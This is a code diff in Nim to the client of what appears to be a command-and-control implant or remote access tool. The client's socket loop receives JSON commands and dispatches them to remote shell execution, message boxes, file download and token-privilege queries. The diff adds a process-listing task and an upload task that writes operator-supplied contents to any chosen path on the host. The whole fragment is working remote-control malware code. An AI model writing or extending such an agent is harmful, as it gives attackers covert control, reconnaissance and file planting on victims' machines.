@@ -2,7 +2,7 @@ import net, base64, json, os
 
 import modules, communication
 
-import ../clientTasks/[shell, msgbox, download, tokinfo]
+import ../clientTasks/[shell, msgbox, download, tokinfo, processes, upload]
 
 var client: Socket = newSocket()
 
@@ -47,6 +47,10 @@ proc receiveCommands(client: Socket) =
         tokenGroups=getintegritygroups(),
         tokenIntegrity=getintegrity()
       )
+    of "processes":
+      processes.executeTask(client, taskId,
+        processes=getprocesses()
+      )
     of "shell": 
       let toExec = jsonNode["data"]["shellCmd"].getStr()
       shell.executeTask(client, taskId, toExec)
@@ -54,6 +58,8 @@ proc receiveCommands(client: Socket) =
       msgbox.executeTask(client, taskId, jsonNode["data"]["title"].getStr(), jsonNode["data"]["caption"].getStr())
     of "download":
       download.executeTask(client, taskId, jsonNode["data"]["path"].getStr())
+    of "upload":
+      upload.executeTask(client, taskId, jsonNode["data"]["contents"].getStr(), jsonNode["data"]["path"].getStr())
 
 
 while true:
